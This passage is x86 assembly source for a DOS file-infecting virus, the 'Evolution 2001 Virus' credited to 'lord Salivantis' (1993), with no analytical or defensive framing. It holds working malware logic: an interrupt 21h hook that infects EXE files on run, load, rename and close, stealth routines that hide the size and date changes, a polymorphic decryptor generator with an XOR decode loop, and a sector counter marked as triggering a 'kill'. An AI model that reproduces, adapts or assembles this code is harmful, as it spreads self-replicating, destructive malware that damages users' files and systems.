	call uninfecting        ; if infected then uninfecting
	call close		; close uninfected file
	jmp end21h              ; and end
no_open:
	cmp ax,4b00h            ; do a program
	je standard
	cmp ax,4b01h            ; load a program
	je standard
	cmp ah,56h              ; rename
	jne no_standard		; standard infections
standard:
	call infected
	jc end21h
	call infecting		; if file isn't infect then do it!
	call close		; close infected file
	jmp end21h
no_standard:
	cmp ah,3eh          	; maybe it's close file
	jne no_close
	call close_infecting   ; if close an EXE file then infect it!
	jmp end21h
no_close:
	cmp ah,4eh
	je directory
	cmp ah,4fh              ; maybe findfirst or findnext function???
	jne no_directory
directory:
	call stealth		; do 'stealth' operation if dir command
	jmp end21h
no_directory:
	cmp ax,5700h
	je dta_stl
	cmp ax,5701h
	jne maybe_setvect
dta_stl:
	call date_stealth	; stealth changed date procedure
maybe_setvect:
	cmp ah,25h		; set vector function
	jne maybe_getvect
	call setvect
maybe_getvect:
	cmp ah,35h              ; get vector function
	jne end21h
	call getvect
end21h:
	call swap_vectors
	pop es
	pop ds
	popa
	cli
	jmp cs:[old21h]

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; interrupt 24h - critical error
; Comment: swap to disable critical errors
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
int24h:
	mov al,3
int1bh:
	iret

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                   DATA
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
dcs		DW 5		; increment of CS
ip		DW 0		; original IP of victim
old_ss		DW 0		; old original SS of victim
teleport	LABEL BYTE	; teleport from decode procedure to virus code
	DB 8ch,0c8h	; mov ax,cs
	DB 05h,04h,00h	; add ax,4
	DB 50h		; push ax
	DB 6ah,00h	; push 0
	DB 0cbh		; retf
text1 LABEL BYTE
DB '-=ğ Evolution 2001 Virus was done by lord Salivantis - Nov/Dec 1993 ğ=-',0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
command1_1:							; commands
	DB OFFSET command2_1-OFFSET command1_1-1
	cld
command2_1:
	DB OFFSET command2_2-OFFSET command2_1-1
	mov si,0ffffh
command2_2:
	DB OFFSET command2_3-OFFSET command2_2-1
	push 0ffffh
	pop si
command2_3:
	DB OFFSET command2_4-OFFSET command2_3-1
	DB 8dh,36h,0ffh,0ffh ;lea si,[0ffffh]
command2_4:
	DB OFFSET command3_1-OFFSET command2_4-1
	mov ax,0ffffh
	mov si,ax
command3_1:
	DB OFFSET command3_2-OFFSET command3_1-1
	mov di,0ffffh
command3_2:
	DB OFFSET command3_3-OFFSET command3_2-1
	push 0ffffh
	pop di
command3_3:
	DB OFFSET command3_4-OFFSET command3_3-1
	DB 8dh,3eh,0ffh,0ffh ;lea di,[0ffffh]
command3_4:
	DB OFFSET command4_1-OFFSET command3_4-1
	mov ax,0ffffh
	mov di,ax
command4_1:
	DB OFFSET command4_2-OFFSET command4_1-1
	push cs
	pop ds
command4_2:
	DB OFFSET command5_1-OFFSET command4_2-1
	mov ax,cs
	mov ds,ax
command5_1:
	DB OFFSET command5_2-OFFSET command5_1-1
	push cs
	pop es
command5_2:
	DB OFFSET command6_1-OFFSET command5_2-1
	mov ax,cs
	mov es,ax
command6_1:
	DB OFFSET command6_2-OFFSET command6_1-1
	mov cx,(VIRSIZE+64)/4+1	; add 64 because part of 4 paragrafs for decode procedures isn't used - so add some bytes
command6_2:
	DB OFFSET command6_3-OFFSET command6_2-1
	push (VIRSIZE+64)/4+1
	pop cx
command6_3:
	DB OFFSET command6_4-OFFSET command6_3-1
	DB 8dh,0eh
	DW (VIRSIZE+64)/4+1 ;lea cx,[VIRSIZE]
command6_4:
	DB OFFSET command7_1-OFFSET command6_4-1
	mov ax,(VIRSIZE+64)/4+1
	mov cx,ax
command7_1:
	DB OFFSET command7_2-OFFSET command7_1-1
	lodsd
command7_2:
	DB OFFSET command7_3-OFFSET command7_2-1
	mov eax,[si]
	add si,4
command7_3:
	DB OFFSET command8_1-OFFSET command7_3-1
	mov eax,[si]
	add si,2
	add si,2
command8_1:
	DB OFFSET command9_1-OFFSET command8_1-1
	xor eax,0fefefefeh
command9_1:
	DB OFFSET command9_2-OFFSET command9_1-1
	stosd
command9_2:
	DB OFFSET command9_3-OFFSET command9_2-1
	mov [di],eax
	add di,4
command9_3:
	DB OFFSET command10_1-OFFSET command9_3-1
	mov [di],eax
	add di,2
	add di,2
command10_1:
	DB OFFSET command10_2-OFFSET command10_1-1
	loop command7_1
command10_2:
	DB OFFSET command10_3-OFFSET command10_2-1
	dec cx
	jnz command7_1
command10_3:

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
commands:   ; numbers of mutation for each command & function witch will be
	DB 1  ; select it
	DW OFFSET command1_1
	DB 4
	DW OFFSET command2_1
	DB 4
	DW OFFSET command3_1
	DB 2
	DW OFFSET command4_1
	DB 2
	DW OFFSET command5_1
	DB 4
	DW OFFSET command6_1
	DB 3
	DW OFFSET command7_1
	DB 1
	DW OFFSET command8_1
	DB 3
	DW OFFSET command9_1
	DB 2
	DW OFFSET command10_1

com_sel_reg DW OFFSET command2_4+1	; command witch select register is
	    DW OFFSET command3_4+1	; required
	    DW OFFSET command4_2+1
	    DW OFFSET command5_2+1
	    DW OFFSET command6_4+1
end_main:
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                              TEMPORARY DATA
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
old09h		DD ?		; dword field to store old 09hth vektor
old13h		DD ?		; dword field to store old 13hth vektor
ori13h		DD ?		; dword field to store original 13hth vektor
old21h		DD ?		; dword field to store old 21hth vektor
ori21h		DD ?		; dword field to store original 21hth vektor
swap1bh		DD ?		; dword field to swapping 1bhth vektor
swap24h		DD ?            ; dword field to swapping 24hth vektor
seed		DW ?		; seed of random generator
six		DB 0,1,2,3,4,5	; list of commands for first six
kb_flag		DB ?		; keyboard flag for CTRL/ALT Delete
sector		DB ?		; read/write sector number form 0 to 2047; 2048 - kill!
pointer		DW 0		; pointer in create decode procedure
jump_point	DW ?		; jump point in decode procedure
boundary	DW ?		; bound of original ints
decode_mask	DD ?		; decode mask
tmp_intr	DD ?		; temporary interrupt vector
intr_seg	DW ?		; segment of actual IDT
path_pointer	DD ?		; pointer to victim path
attrib		DW ?		; victim's original attributes
date		DD ?		; date last modification of victim
size_file	DD ?		; size of victim
SFT_pointer	DD ?		; pointer to SFT chain
headerEXE	DB 20h DUP(?)	; buffer for header of EXE file
descIDT		DF ?		; pseudodescriptor48 of new IDT
disk_buffer	DB 512 DUP(?)	; buffer for disk test
IDT		DB 3ffh+16d DUP(?)	; new IDT - it's must be last!!!
end_tmp:
code16 ENDS
END artifical
